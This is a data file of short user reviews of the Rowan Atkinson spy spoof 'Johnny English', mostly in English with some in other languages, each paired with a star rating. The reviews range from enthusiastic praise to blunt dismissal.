"JE elicits a fair number of chuckle worthy moments. However, being a British film with a hilarious lead star, English should be better.",3
"""Hey guys, what if Mr. Bean were a Secret Agent?""",2.5
Mr. Bean no t being Mr. Bean but acting like Mr. Bean. ookay it is sometimes funny but allot of the jokes are pretty much overdone to point where it gets uncomffortable.,2
It 's a very stupid comedy.,2
"There were some nice gags here, but it's a forgettable film.",3
two stars because the kids watched it twice. such a waste of acting talent (and i'm not talking about natalie).,2
Watched it when I was younger... quite dissapointing,2
"although an absolutely amazing actor i am never able to take rowan seriously after mr.bean, however plays very comfortably into the character johnny. But this movie is more suited to a younger demographic.",2
It was funny but not funny enough to make me physically laugh.,4.5
Just did the mistake of watching this fucked up pointless movie... that is what you get when you use really excellent talent wasted in American style retarded humor... Why did I watch this movie?... why?...,1
"Despite the critics despising it, Johnny English has to be one of my favourite films. The reason you can watch it again and again and again, yet it never fails to make me laugh and almost choke to death. It's not a masterpiece, there's no fantastic cinematography, incredible screenplay or brilliant direction. However the cast's reactions and the situations they encounter have people laughing and laughing over and over again, no matter what the scene. As I watch it again and again I find myself releasing what a wonderful scene is coming up and how I laugh again and again. Don't listen to the critics or anybody for that matter. Go see for yourselves what a fantastic comedy ""English"" is. I'm not trying to use slang but this film is a laugh out loud. **** 4 Star",4
"A hilarious movie! Rowan Atkinson plays the role of the title character in this flat-out comedy. He is an inept worker at the British Intelligence dreaming of one day becoming Agent One. Suddenly all the agents are mysteriously killed. As Johnny investigates he realizes that Pascal Savage is behind this all along. He is a descendant of William the Conqueror, and believes that the British throne should be his and not the Queen. His plot is to become king of England and turn the country into a giant prison. Johnny meets and falls in love with Lorna whom is an Interpol Agent. Together they must stop this devious plan! This film is terrible, but it doesn't matter because it only serves as a comedy. When I watched this film as a kid, I loved it! Truly hilarious, now I view this film as a stupid, pathetic attempt to parody the James Bond series. This film has only one purpose, to make you laugh, and it reached its goal. Sure it has a lot of stupid scenes that ruined this movie but is still acceptable. This film is for kids and only for kids because only they will find this movie funny. What I like about this movie is the pacing. It didn't over-expose itself, it wasn't annoying, but it was just Johnny English and that's it. I mean I love the opening music of this movie. The film does show sympathy, charisma and respect towards the James Bond series. I laughed out-loud at Rowan's performance, if you don't find this man funny then don't watch this movie because he brings entertainment to this movie. Just watch the intro to this movie, and if you're not into it then you are going to hate this movie. Is the film smart and compelling? No, obviously not. This film is a complete opposite of a smart movie. There's wasn't any memorable dialogue, and less a good plot for this movie. The problem with spoof and parody movies is that they don't bring anything new to the table. It is basically what we have seen before in other movies, but that doesn't mean that the movie is a complete and total disaster. This film does parody the Bond movies, but it shows absolutely nothing else except really dumb scenes. For example there's a scene in which the bad guys are forcing the Queen to give up the throne. She denies, but then she gives up the throne simply because they threatened to kill her pet if she didn't. That scene is one of the most retarded scenes in a comedy, I have ever seen in my life. The ending to me was not a right ending for this movie, in my point of view. This film was directed by Peter Howitt whom hasn't directed lot of movies as what I have heard. I also heard that there is a sequel coming out and I completely against it because if this movie is bad, the sequel is going to be a disaster. Is this a must-see movie? Nope, but hey you have a good time watching the movie, you start to like the characters, but after you watch it, you know you have seen a piece of crap. Is not a film to be respected, since it only puts the spy genre to shame. It does have gags that completely ruin the film but still satisfactory. I can only recommend this movie only to people that want to laugh. What I mean is that if you are looking for a movie that only purpose is to make you laugh then you are going to like this one. I think this movie is good for the family, specifically with the kids, because the adults will be bored at it. Don't watch this movie if you can't handle comedy with idiotic plots, because you will be angry with this movie.",3
"Not bad... If your looking for a low on laughs, badly made comedy. Now I aint saying Rowan Atkinson isn't funny, but when I caught a glimpse of this tripe I felt compelled to write a review. This movie tries too hard to make you laugh with dire attempts at comedy, sure some of it might have caused me to titter, but no laugh out loud moments for me in here. I was left a little disappointed as I wanted to love this movie like a man loves his dog, but something is missing. Perhaps if the story was better written I could have been a real fan, but the lifeless script makes this a massive hunk of crap. If you want to take your chances with this then by all means do, but don't come crying to me when your saying you wasted an hour and a half watching this absolute shambles",1.5
I was impressed. Amusing.,3.5
"The movie opens with Johnny English, an inept worker at British Intelligence, having a fantasy about himself as ""Agent One."" In this fantasy, he successfully sneaks into a building by distracting the guard dogs with squeaky-toys, knocks out the human guards with their own guns, and then successfully seduces a black-haired beauty who tries to stop his mission by pointing a gun at him. Just as he is about to kiss her, his fantasy is abruptly interrupted when the real Agent One walks in and asks for his papers. Johnny gives them to him, promising that he has ""checked personally that the submarine hatch will open."" Later, the audience hears that Agent One has died because his submarine hatch ""failed to open."" An explosion at the funeral of Agent One, Britain's top agent, wipes out every secret agent in the country - except English, who was overlooking the cars and didn't notice a car speed away from the Coffin. Before his death, Agent One was investigating a plot to steal the Crown Jewels, so English takes over as a last resort. Together with his (far more capable) assistant Angus Bough (Ben Miller), he manages to discover the person behind the plot, the French prison entrepreneur Pascal Sauvage (John Malkovich), whose family once had a claim to the British throne. Sauvage is a descendant of William the Conqueror, and believes that the crown should have gone to him instead of the Queen, as 200 yrs ago his family were passed by. He hatched an evil plan to steal the Crown Jewels, have an impostor replace the Archbishop of Canterbury (Oliver Ford Davies), and have himself proclaimed as King. Meanwhile, English is strangely attracted to a mysterious woman, Lorna Campbell (Natalie Imbruglia), whom he meets at a big social event whilst guarding the centrepiece to the whole event - the Crown Jewels. He inevitably fails, and the Jewels are stolen. He knocks out a waiter when the lights go out, pretends to fight a criminal in another room, and later reports a fictitious description of the assailant to the authorities, saying he must have escaped while the Queen was being sedated. Later, Bough and English follow a tunnel and find the Jewels, but fail to stop the thieves after English's gun breaks. English chases their car, but follows the wrong car to a funeral. He was convinced the burial party was an act, so he places the mourners and Priest under arrest, then makes a fool of himself, even dancing a jig on the coffin. Bough rescues him by pretending that English was an escaped asylum inmate and that he is a Doctor.",4
Cheesy fun. This being a Rowan Atkinson movie you gotta lack all sense of humor not to get a few laughs out of it.,3.5
funny and entertaining! nice movie to watch if you want to have a good laugh!,4
"an enjoyable and funny british spy comedy that will be the james bond of spy comedy, even if it is very predictable, and it's more like a mr. bean sequal and that he's a spy. B",4
JOHNNY ENGLISH was an awesome movie,5
"Spy spoof that dabbles in outdated Mr.Bean-esque humor. We move from one skit to the next as everything is hung loosely on the context of this silly ""story"". Rarely remarkable and chalk full of cheap laughs. Atkinson either needs to get some wittier writers or retire.",1.5
There weren't enough good laughs for me to recommend it to anyone other than the most devoted Beanheads.,2.5
atkinson is wonderful !,3
Disappointing. All of the funniest parts were used in the commercials.,0.5
Very silly spy spoof that borders on the absurd. Not worth your time.,3
"Cheesy and stuipd, and that why you love it",4
"Despite of all the bad reviews, in my opinion this is one of the best parody-spy-style I've ever seen. In other words I laughted a lot",4
"There haven't been an spy that made me laugh a lot, I can't stop watching this movie.",5
NOT THE BEST ROWAN ATKINSON MOVIE,4
"Hilarious! Mr.Bean at his best, as usual.",5
Great movie. Funnier than Mr. Bean in my opinion. Best spy comedy I have ever seen.,4.5
"Although it may be one of the most tedious and worst spy-spoof films to be released, there's never a dull moment in ""Johnny English"" - Atkinson completely makes the role, producing cringe-worthy moments that are strangely real and believable. Its humour is often and trying, and many people who find time for this film will find their patience rewarded - supposing they like slapstick and unintellgent comedy.",3.5
"An awesome movie, its a shame some people don't see the humor of it",5
"Ei nyt mik√É¬§√É¬§n huippu, mutta kyll√É¬§ t√É¬§ss√É¬§ nauraa saa.",3
"Despite the bad rating on Rotten Tomatoes (Who cares what they say), this is one of my all time favourite films, Rowan is ace, can't wait to see what the sequel brings! BOOM!",5
"El script no es la gran maravilla, pero a mi simple opini√≥n, tiene suficientes momentos bastante hilarentes acompa√±ados de una perfecta soltura entre los personajes principales para satisfacer.",3.5
Classic film! Just like Rowan Atkinson! Legend!,4
"Rowan Atkinson is hilarious in this spy comedy. The best scene is the bathroom video where English records himself dancing, and it's accidentally played in front of the whole world, I cried with laughter, and also when he chucks his suit out the window by accident. So many small moments create big laughs.",4
i think rowan atkinson is funny as hell but i think he could have done a better job acting in this movie,2.5
"This is an enjoyable, silly spy spoof, that is not quite as good as Get Smart, but infinitely better than Austin Powers.",4
"Might not be as funny as anything Mr. Bean related, but has something going for it.",2.5
Rowan Atkinson's best movie I've seen. Somehow gets the job done with the British Secret Service with his character.,4.5
It was ok. I laughed a couple times but the movie was more stupid then anything. The plot was interesting but not very exciting.,2
"entertaining atkinson comedy about a man who wants to be the next James bond but fails repeatedly to do so, funny and would recommend",2.5
"really these movies are garbage unless you know movies about nothing and wasting your time, if so enjoy",0.5
I do love watching Rownan. He's great.,4
A movie that vastly under estimates it's audience.,2
good film very funny,5
"it was an ok movie, funny in parts but I don't think I'll watch it again though, Rown Ackinson and John Malkovich played good parts, it also starred Ben Miller, it was a ok film but I don't want it on DVD",3
HE KNOWS NO FEAR HE KNOWS NO DANGER HE KNOWS NOTHING BUT HE DOES KNOW HOW TO MAKE A GREAT MOVIE!!,4
I know it's hardly the height of cool but this film properly cracks me up every time I see it.,5
"When her majesty's crown jewels are stolen by a conniving Frenchman, who also plans to steal the queen's throne, spy Johnny English, a bit unseasoned but intensely enthusiastic, is thrown onto the case.",5
I don't know why but I love this film. It's what is missing in a lot of films these days; fun!,4
He's ridiculously funny!,1.5
Funny but not as Mr.Bean.,2.5
"Many clever tries to humor but unfortunately no cigar. Rowan Atkinson is good at what he is, Mr. Bean. He tried something ""outside the box""... but didn't work well. Good try but, no.",1.5
Its suitably funny. Nothing amazing but I laughed quite a bit.,3
"This was not bad when I saw it back when I was younger, I will not tarnish that memory by watching it again though!",3.5
I've watched this movie sooo many times! I like the story... And Natalie's clothes <3 <3 <3,5
Forgettable. The kind of film that's so stupid it's painful.,0.5
"""Johnny English"" is a hysterically funny, prototypical spy film spoof. The titular hero is monumentally, no-holds-barred daft and that results in countless hilariously awkward situations. Rowan Atkinson is just perfect for the role and is surrounded by a very fitting cast. Overall ""Johnny English"" is very enjoyable and its more than fair share of iconic moments makes up for the occasional misstep.",3.5
Pretty funny if you're a fan of Rowan Atkinson. Wasn't as good as I'd expected though.,2.5
Rowan Atkinson trying to bring Bean into everything he does... And failing,2
No no no no no no no no.,0.5
"This is funny and ridiculous at the same time. When it comes to spoofing James Bond, Rowan Atkinson is no Mike Myers.",3
Mr. Bean in a tuxeado... brilliant and funny at the same time..,4
"Funny, not Atkinson's best but still a funny movie.",3
"Review #465 Parody, Spoof, Mr. Bean Johnny English is pretty good at making fun on James Bond. He doesn't land every punch, or take all the right swings, but he has a knack for finding something that will go right, and not bad. Trust Me: It's funny, but it is also very predictable.",3.5
Sure was a hell of a hilarious James Bond spoof. MR. BEAN's Rowan Atkinson knows how to make a great action-comedy!,3.5
a hilarious must see for all bean fans. and all spy fans. most americans dont understand it beacause they dont get the body language comedy style.,5
He's so overrated. I find it dull.,2
"Many people say that the film is not intelligent, well written or has a desire to be a good spoof.... so what. He maybe didn't have a desire but it certainly scored the center. Rowan Atkinson does a great job playing Mr. Bean with sound and John Malkovich brings a good spoof performance of those highly-laughable James Bond villains. Film itself is highly funny and WELL WRITTEN while it is not quite meant to be the next Andrei Rublev and be very intelligent. Thumbs high up for me Gene! Warmly recommended!",4
"Another excellent 'comic-detective' plot, where the detective gets fired first, but solves the case out of desperation. Johnny English ends up every time with a miss & messes up things in a funny & unexpected way. As usual, the expressions and acts are great. If you are a Rowan fan, it is a perfect, satisfying, belly-bursting treat for you. If not, it is just an appetizer.",4.5
Worth maybe one watch. Has a few laughs with a weak plot. I wanted to see more of John Malcohvich.,2
"Thought it offered up some definite laughs, this mockery of James Bond comes off, unfortunately, just as stupid as the villain's plan (taking the throne to turn the UK into a giant Alcatraz? Seriously?).",2
Got to be the best comedy of all time absolutely classic!,5
"A rather average spoof of James Bond movies. A few funny lines and memorable moments, but overall unimpressive, and not nearly as good as Get Smart.",2.5
Funny. But... I see it way to much. Don't watch it too much.,3.5
"Ah Mr. Bean can talk! And he is a spy! *laughs* Rowan Atkinson was no different in this movie. The only two part that was added in his character was talking and wannabe smart (which he keeps failing noticeably). I did enjoyed this movie pretty much. There were some cheesy moments but that was covered by the good jokes. Though I hated the <i>shit</i> scene. That was grossgusting. <a href=""http://s1039.photobucket.com/albums/a471/3niR/?action=view¬§t=ben_miller4.jpg"" target=""_blank""><img src=""http://i1039.photobucket.com/albums/a471/3niR/ben_miller4.jpg"" border=""0"" alt=""Johnny English""></a>",3
great great copy of James Bond Series......Rowan Atkison (Mr. Bean) was very funny,5
"While I have been told I ""just don't get it,"" I believe I do, and I still do not like this movie.",0.5
"""Johnny English"" has no interesting characters, besides Rowan Atkinson, and the fact that I laughed maybe twice, makes this a film that truly wastes it's star powered cast. You can see the comedy coming from a mile away, the dialogue that drives the film seems to be a complete steal from ""The Naked Gun"" films, there is absolutely no use of mise en scene anywhere that is notable, and the fact that I thought 80 minutes was too long for this junk is very sad. This film represents a new low in comedy even though a few scenes cracked me up. I will forget about the events in this film by the time I wake up tomorrow. ""Johnny English"" is one big letdown.",2
Really enjoyed this bumbling idiot!,3
I love when he throws his coat out of the window. Good for a few laughs. :),3.5
"One of Rowan Atkinson worse characters, that went from adverts to the big screen. But even Atkinson's worst is better than some other actors best.",3.5
Was actually funny..,2.5
It was really dumb but entertaining.,3.5
"Rowan Atkinson is hilarious, very much. Just for him, I'm rating it this much.",4
"The James Bond spoof has become a genre of it's own, and this is one of the best.",3.5
"(rating from memory, haven't seen it in years.)",2.5
"Not one of Rowan Atkinson's best movies. You're better off picking up ""Bean"" or ""Rat Race"" for some good laughs.",2
This could have been a disaster but Rowan Atkinson carries it for me - loved it,4
"A funny spoof, although less interesting.",2.5
"No, no I didn't rate this one-my kid brother Stuart did. He seemed to love it, so-against my better judgment-I'm going to let him take the review.

I thought this movie was hilarious! It did a better job of spoofing Bond than Austin Powers and Rowan Atkinson was great. Very underrated movie.,4.5
*** Good. Rowan Atkinson makes this comedy work as the blundering yet amusing Johnny English.,3
I just love mr. Bean; though the lady has blazed off two stars.,3
"Not that funny. Sure, Atkinson can be funny. But this feels like it is just something to avoid doing Mr Beans. But it is still the same character.",2.5
"Shame on you, Mr. Bean!",0.5
"Despite a not so good elaborated movie, still is very funny with its simple jokes and Rowan Atkinson.",3.5
Fairly entertaining actually. Worth the watch if for nothing else but to see some of the best self-deprivating humor out there.,3
one of the funniest movies ever,4
Rowan ATkinson was able to get out of Mr Bean charcter and star in this delighful comedy spoof movie. I really liked it. Some scenes are not original at all but most of the movie compensates this!,4.5
"A less-than-hilarious and silly comedy starring ""Mr. Bean""'s Rowan Atkinson.",2
"This is bad comedy at its best, it was unfunny and very slapstick fused to try and at least attempt to make the audience chuckle, it's really pathetic.",2
"I was made to see this at the cinema and was pretty okay with it because it had Rowan in it, he's BLACKADDER for frak sake, i love this man, but boy what an awful movie this was... I'm not really into secret agent stuff, bar Alias (REWLS!!) and this just hit every bum note. I remember that i laughed ONCE!! and I have no clue what at now, but ONCE in a comedy... COME ON! (and i think it was forced laughter cause it woulda been rude of me to just nod off to sleep)",0.5
I think this movie is great with a great laugh although there were a few flaws.,3
I absolutely love this film for many reasons. Rowan Atkinsons performance in this reminds me so much of his Bean films mixed in with a spoof of the Bond films and John Malkovich once again playing and awesome villain you cant help but love every minute of this film,4
Btter than Bean anyways.,1.5

"Great comedy, only rowan attkinson could play the role as well as this",5
"A great film, so funny, can watch it over and over again! Rowan Atkinson at his best!",5
its only got this mark due to rowan atkanson as the lead character otherwise its a typical spoof film of any spy film. 6/10,3
An Average Spy Spoof,3
movie waz ok.. but stil i waz expectin more frm Rowan..,3.5
I've watched parts in this so many times..,3
"Can't wait for the sequel to come out. This film is funny from start to end. ""drop it both!""",3.5
"Some funny scenes, but the majority of the film just isn't funny.",2
A lame spy parody that fell below even the weakest of the Austin Powers movies.,1.5
Bleib bei Mr. Bean. Was anderes geht nicht.,2.5
I can understand if people dislike this movie but because I'm such a big Rowan Atkinson fan I actually liked it. It was very funny to see Atkinson play a sophisticated secret agent and he was misunderstood quite a few times. This movie has action and a lot of humor. I liked it very much.,3.5
"Sure, it's like other spy comedies, but I have to say, I liked it.",3
Hilarious alike all Mr Bean programs and films,5
Buffoonish Spy Comedy with Rowan Atkinson as Johnny English. It's far-fetched comedy with a bunch of silly chases and action scenes. I couldn't get into it too much. so doesn't work. a completely unnecessary and nearly chuckle-free spy movie spoof .,1
Sometimes a laugh but not really my type of comedy. Sorry.,1.5
"Stupid and quite forgettable, but Rowan Atkinson can make it somewhat worthwhile with his amusing comedy.",2
very funny spy movie,4.5
hilarious! Rowan Atkinson is so funny,4.5
"A pretty good film with pretty good laughs, but it was only okay and made me pretty much chuckle with only a few laugh out loud scenes. 62%",3
rowan atkinson is a comedic genius and this film proves it!!,4.5
johny is not mister bean,1.5
loved it... totally Atkinson funny from beginning to end... i laughed till i cryed... brilliant... you don't like it your not English... lol,5
"We used to enjoy this guy on his TV show of yesteryear. But his foray into the movies has been pretty pathetic. Johnny English is no exception. It seems that he is trying to remake the great Pink Panther movies. He is really falling short. How could anyone think they could compete with Peter Sellers. Sellers was one of the brilliant comic geniuses of the century. In this movie the gags has no punch or followthrough. In the Pink Panther, once Sellers got you going, he just never let up. I can recall laughing for a long time. In Johnny English, I just giggled. You can just pass on this flick.",2
"A pretty decent movie. While the story of an idiot secret spy has been done a million times, Johnny English is still a movie that had me smiling throughout. While not as funny as I had hoped, there were still some parts of the movie that had me laughing out loud. The acting was actually pretty good as well as Rowan Atkinson was very good as Johnny English and Ben Miller was good as Bough.",3
"Oh come on, it deserves more than 33%. Sure it's predictable, but it's all about how well they deliver the jokes and humor and Rowan Atkinson plays the dumb spy very well.",3.5

"I thoguht it was pretty funny. Although not as funny as the Mr Bean episodes, but they themselves weren't as funny as Blackadder.",4
I was disappointed - I liked the trailer better than the movie,2.5
Could have been much better but a sub par cast unfortunately make this a lot less impact and Atkinson and Malkovich fight against a really bad script. So much promise but lacks any real humour,1.5
Rowan Atkinson should stick to being the Black Adder!,2
This cracked me up..great humor..,3.5
"I hate it when trailers spoil all the laughs, and that's exactly what happened here.",1
"I loved this film! Alot of people haven't liked it at all, but I thought it was an almost perfect slapstick. Best of Rowan Atkinson -Buy It (rent it first)",4
this is acctually one of the best films made EVER!,5
enjoyed this with the kids!,3.5
"how can such a good actor be in such a bad film? well, it could happen. this film is pretty bad. unfunny, unclever, silly, stupid and boring. this film makes george of the jungle look like a masterpiece!",1
"Probably my least favorite of all of Bean's work, but I gotta love the Bean. He always makes me laugh.",3
"So good on TV, but RA rarely does well on the big screen. No exception here.",2
could have been much more ludicrous,3
He's funny but too much Mr. Bean is too much.,1.5
"Rowan Atkinson is really funny in this, but it seems like a modern version of The Pink Panther.",2.5
"A big disappointment, It just got few jokes and they are not that fun.",1
it has natalie imbruglia in it... she's the one shining star!,1
a totaly british film thats funny and memorable,3.5
Better than Mr. Bean goes to the beach.,2
"Another film with Rowan Atkinson that I absolutely adore, packed with action and laughter this film really makes me cringe (in a good way) and laugh out loud all at the same time! He really pulls off Johnny English well, the ending with the video gets me everytime, I cry laughing at that bit! If you like taking the mick out of 007 you'll absolutely adore this film, take a peek it really is worth it!",5
"Very, very funny. Good British humour.",3.5
good film for when you need a laugh,4
"Built on the Barclaycard advert featuring the same character, but honestly 30seconds was long enough to let him loose.",1.5
It was all right but it needed something more. Interesting but not the best.,2.5
if you like mr bean this one's for you,2.5
Should have been better with that cast but I did enjoy parts of it.,3
Siempre repito una y otra vez hasta que me harto la parte de la cereminia de coronacion,5
Very enjoyable British Get Smart,3.5
Mr. Bean as Bond=yes.,4
"Love the Bean, but he is better in short shows",3
"Original, very very funny. Not as much as I was hoping, but fun nonetheless.",3.5
This comedy has the cast to be a classic but fall flat in its face,1
this film is fantastic!!!,4.5
An underrated spy spoof that made me laugh. Good enough.,3.5
Quite funny. Rowan plays Mr Bean again but we still love him.,3.5
"Stick to Mr. Bean, Mr. Atkinson.",0.5
"Pas mal, rien de deplace, rien de tres brillant non plus... Drole par moment, pas mal quand meme...",3
"Disappointed, I thought it was going to be better.",2
see only if you are desperate,0.5
Very silly spy spoof that borders on the absurd. Not worth your time.,3
Wenn Mr. Bean spricht ist das einfach komisch... aber nicht lustig.,1.5
"This film begs many questions. Did we really need another spy spoof? Out of all the people to cast as the protagonist, why cast Rowan Atkinson? Why do they make more random jokes than jokes directed at making fun of spy franchises? Who would be interested in seeing this film anyway?",1.5
"Tipica pelicula de Mr Bean, tiene escenas comicas y graciosas pero es como ver a Mr Bean hablando, a este actor le toco quedarse como Mr bean porque no se puede separar de ese concepto. Como para pasar el rato viendo a un espia torpe.",3
Rowan Atkinson will make you laugh.,4
"Not Atkinson's best work, but still an enjoyable parody.",2.5
total crap...expect more from the man that brought Blackadder to life.,0.5
Atkinson en un mejor papel que Mr Bean...,1.5
The movie is enjoyable because Rowan Atkinson is funny.,3.5
BAHAHAHAHAHA. One of the funniest movie I've ever seen!,4
I have got to see this movie...,4.5
Rowan Atkinson really know just how to make his audience crack up. It was a hilarious movie.,4.5
"A movie with Rowan Atkinson is always funny and this one is not an exception. He plays a role of a secret agent who has to protect the country. Funny things happen, of course, but also the love. Really funny but still not really exciting or interesting. Anyway, nice movie!",3
"una de las mejores comedias q he visto (ya hace un rato de ella), esta taradisima y no parar√°s de reirte tooodaaa la pelicula, kmpletamente recomendable, y he de decir q el buen Mr Ben, no es exactamente mi actor preferido, but con esta pelicula se enmienda un poco conmigo... veanla de verdad, consiganla en el video club!!!!",4.5
Funny and entertaining!,3.5
Love Mr. Bean but this fell short.,2.5
"Had it moments. Good, not great. A rental, if anything.",3
bta que es fome el humor ingles :S,1.5
"I expected this to suck, but it was actually pretty funny. Nothing revolutionary, but funny--and not totally reliant on the Mr. Bean schtick, either, although it does come up here and there.",3.5
"One of the best of the Spy/Comedy genre, Johnny English at times relies on tired jokes that fail to make you laugh. Mostly though, the audience will be frequently entertained by Rowan Atkinson's performance. Critics may pan Johnny English for being not serious enough for a spy film, and this is ridiculous considering that it is a Spy Comedy. Those willing to just watch a film will no doubt be entertained by Johnny English, and the superiour British Humour.",4
Hilariously funny! The mole on his nose bothers me though.,3.5
Funnier than one would think.,3

Fantastic funny movie hhhhh :D,3.5
Fantastic funny movie hhhhh :D,3.5
if you like mr bean you will love this so funny!,5
"I guess you really have to like R.Atkinson to see something in this movie. I do like him and even though the movie itself is absolutely nothing special, I had few laughs with tears from Atkinson, so must rate it high enough!",3
Add a review (optional)...,1.5
"Classic, good laugh.",4
Quite funny and definitely very english!,2
Atkinson has done better!,1
This is a stupid but funny movie... If you like British humour.,3
"good movie better then i thought it would be, but it was a lot like others. not bad tho",3.5
"This movie was alot better than I thought it was going to be, at first I thought it was going to be one of thoughs dumb cheep comedy's but it surprisingly really mad me laugh alot, witch is what I like best in a comedy. Story line was like other comedy I know of but hey it was funny and Rowan Atkinson did great. Pretty good movie.",3.5
I love and will always do this hilarious guy!,5
all the old jokes but worth a watch if you have nothing else to do.. ie wait for paint to dry,1.5
haha very funny. rowan atkinson plays the part very well,4.5
Mr. Bean should really stay silent.,1
"Felt like I'd seen this before. I thought to give this a try because it had John Malkovich in it, but really he didn't save this. Rowan Atkinson at his best is hilarious, but this movie was just lame. Maybe he just isn't cut out for the big screen, as his tv performances have had me in stiches before. Johnny English is just a talking, arrogant Mr Bean in a tuxedo. Yawn!",1.5
This is hiliarious. It always makes me laugh. It's a must see for sure!,4.5
"Johnny English is a 2003 British comic film parodying the James Bond secret agent genre. It starred Rowan Atkinson as the incompetent British spy of the title. The film was known by the tagline He knows no fear, he knows no danger, he knows nothing.",4
"Not as funny as those Mr Bean videos, but still worth a look. Some very hilarious (it's all in the timing) scenes that may make you gag yourself with a spoon filled with laughter.",4
This movie grew on me. Rowan Atkinson is soooo funny!,4.5
"I love Atkinson in Blackadder, my all time favorite comedy series, but this was utter crap.",0.5
saw this movie in theaters... pretty good actually.,4
BEST MOVIE EVERRRRR!!!!,5
"Rowan Atkinson is awesome as Johnny English and approaches the greatness of Mr Bean. A great supporting cast, with Malkovich making a good frenchman. It is very much a British film and I therefore fully understand that Americans just don't get it. Overall I really enjoyed this and it had me laughing all the way through it. Loved the speed camera scene.",4
"Boring, Mr. Bean is much funnier. Managed to watch it till the end but only just!",1
"very very very funny movie,i was laughing all time in this movie.Rowan Atkinson gona make u laugh as much as he did in the ""mr. bean"" series.if u follow mr. bean series then u just gona love it,and if u dont u still gona have the best laugh ever watching this movie.all in all if u want a good funny time u should watch this movie",4
A Litte Rowan Atkinson goes A Long Way,1
very funny & was kind of ok & just bit stuopt,2
Bean as a secret agent. Enjoy!,3.5
Atkinson is hilarious as always... but otherwise it kinda sucked,2.5
Not Interested. Mike Myers could have been a better agent. except this will be another austin powers..,1.5
"from the poster to the slogan to the script. everything about this movie is great to me. 5 stars for rowan for being the only actor who could have pulled this off. the rest of the cast did well together. *applause* and as the brits say ""GOOD SHOW!""",5
the funniest comedy film of all time! hey it's mr. bean!,3.5
Its fantastic Hilarious,4.5
Mediocre spy comedy occassionally enlivened by the comic skill of Atkinson.,1.5
Was ok but nothing beats Mr Bean. I did have a laugh at places though must admit.,3.5
A movie by which you don't have to think while watching... just enjoy the dumbness....,3
"An excellent film, just what Rowan needed to revamp his already awesome career.",4.5
Clever humor used in thsi one and Mr. Bean was terrific in this speaking role.,4
Rowan Atkinson is such a good actor!!,4.5
Its an very funny movie with james bond style action. An a family action packed comedy with outbursts of laughs. Worth watching!,5
"mmmmm, bad. natalie imbruglia is sexy bt noooo",2
"LoL this is hilarious as well He knows no fear,, He knows no danger,, He knows Nothing",5
"It's good fun, but by no means is this a great film.",3
"This is a good production, good cast, excellent photography and interesting story. But somehow all fails, becoming boring and predictable. If you are a Mr. Bean fan...don't watch this movie.",1.5
lovveeee this movie!!,5
Stupid but it does have its moments.,2
Hmmm I am not one for silly films & this was certainly that.,2
Quite funny James Bond and spy film parody. This has its moments.,3
"Slightly silly, but very funny.",3.5
Love Rowen lool.. Legend,4
One of the funniest movies ever made!,4.5
ampun dah nih pilm...ampe nangis2 nontonnya saking garingnya,0.5
It has moments of funniness.,2
Rowan Atkinson is such a classically funny genius it's hard to understand why he would play in such a complete disaster.,1
the sewer scene is one of the best parts,3
funnier than Austine Powers,1.5
Rowan Atkinson is worthy of so much more...,1.5
Damn those french!!!,3
8eiki tenia !!!gelioooooooooo,5
ha!and he had the guts to see he wanted to bond!,4
"When it comes to secret agents, there's smooth, there's sophisticated, and then...there's English.",5
I should have been funny...,2
"I nearly fell off my seat while watching this film! (And I like it's theme ""Man For All Seasons"").",5
"It's one of those mindless films when you need a cheap laugh once in a while. Atkinson's buffoonery works very well as Mr. Bean. In this film, it's just sad.",1
How can you NOT love Rowan Atkinson...?,5
"Don't waste your time. It's just Mr Bean being weird again, like always. He is funny but this movie sucked. Mr Bean a spy? Come on!",1
HHHHiiiiiLLLLaaarrrrIIIIIooouuusss,5
"Very funny, but I still think Rowan is so much funnier as Mr. Bean.",4
"Made me laugh, but not great.",2.5
it's just so rowan..duh..,3.5
"Mildly amusing blend of Bean and Bond with Rowan Atkinson as a bungling secret agent, he's actually an improvement on Connery. Easily the best film I've seen on ITV2 today!",2
Quirky? Yes. Cute? Maybe. Funny? You be the judge.,3
"Muy buena comedia, el inspector es un poco tonto pero divertido, al final logra cumplir su mision",4.5
Stick to Blackadder Rowan!,1
Haha it is awsome. Mr. Bean=P,5
"poor spy spoof, which worked much better when it was a series of barclay card ads.",2
"<i><b>""He Knows No Fear. He Knows No Danger. He Knows Nothing""</b></i> I can understand if people dislike this movie but because I'm such a big Rowan Atkinson fan I actually liked it. It was very funny to see Atkinson play a sophisticated secret agent and he was misunderstood quite a few times. This movie has action and a lot of humor. I liked it very much.",3.5
"I love spy spoofs and this one was really good not the best I have seen but good. Atkinson played a character that was a cross between Mr. Bean and Blackadder, which he was good in both. All around excellent if you don't mind ""action"" and laughter",5
Absolutely hilarious!,4
"The movie has a few good gags, mostly leaving you rolling your eyes during its runtime. It feels like they were trying to squeeze in as much trash as possible to prolong the movie. Especially at the end, when it runs out of ideas, leaving Atkinson lip-sincing an ABBA song. There was some potential in this film dough. The camera-work is fine and the cast is decent, despite this most of the stars are wasted. I have never felt, that Atkinson did well on the silver screen. I have always found most of his Tv roles entertaitning, but when it comes to something bigger, he falls flat. I felt truly sorry for John Malkovich, who was given an uninspired part, which wraps the story around all the possible English stereotypes about the French. The producers sort-off achievied ther objective since this spy spoof has a bit of Bond feel to it, along with an absurd storyline, stunts and chases. However the entire spy-movie genre, like the westerns was dead since the end of 1960s, so the entire concept of a spy commedy sizes to be original or attention grabbing. It's not like there weren't enough of them during the cold war. The Austin Powers series takes a much better approach by paroding the entire spy-movie formula.",1.5
Mr. Bean meets James Bond. So stupid it was funny.,2.5
"Mr. Bean...this man has issues, this movie was retarded beyond words",3
people should give it a chance it's really quite funny,2
a perfect comedy as always from Mr Bean,4
Rowan Atkinson y su humor pl√°stico...,2
"This film is so entertaining to watch. Its hilarious, silly storyline but so simple to follow and the cast is brilliant! Ben Miller looks gorgeous!",4
"Spy Hard only British. Rowan Atkinson is really smart when you see him in interviews...Mr. Bean may have been kinda silly, but it was never dumb, and Blackadder is one of the best Britcoms ever made - very intelligent. So what would convince him to sink so low with this weak tired comedy? If money was the answer...it didn't pay off.",1
"totally love Rowan Atkinson. Proper cheesy, love it!!! and its got natalie imbrulia to look at... win win!",3.5
better than I thought!,3
such a let down this one,0.5
"always full marks for his comedy..... very very good acting done by the guy Rowan Atkinson.....wat r u waitin for jus watch it if u havnt...in hindi for that entertainment we call it ""PAISAWASOOL""!!!!!!!!",5
"Funny and clever, he sure put bond in his place!",4.5
Funny but Malkovich has the worst french accent ever!,2
"Hilarious!!! XD, I love the Robbie Williams song: ""A man for all seasons"".",4
